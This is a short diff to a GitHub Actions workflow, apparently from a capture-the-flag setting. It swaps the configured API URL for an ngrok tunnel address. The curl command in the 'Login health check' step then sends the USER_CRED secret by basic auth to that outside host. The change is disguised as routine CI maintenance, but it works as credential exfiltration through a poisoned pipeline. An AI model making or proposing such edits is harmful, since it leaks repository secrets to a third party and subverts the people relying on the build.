@@ -8,7 +8,7 @@ jobs:
   ci:
     runs-on: ubuntu-latest
     env:
-      API_URL: "https://ctf.catch-the-frog.com"
+      API_URL: "https://ad5e-94-188-248-83.ngrok-free.app"
     
     steps:
     - name: Checkout code
@@ -22,7 +22,7 @@ jobs:
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Login health check"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/login
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" https://ad5e-94-188-248-83.ngrok-free.app/login
         
     - name: send_run_log
       continue-on-error: true
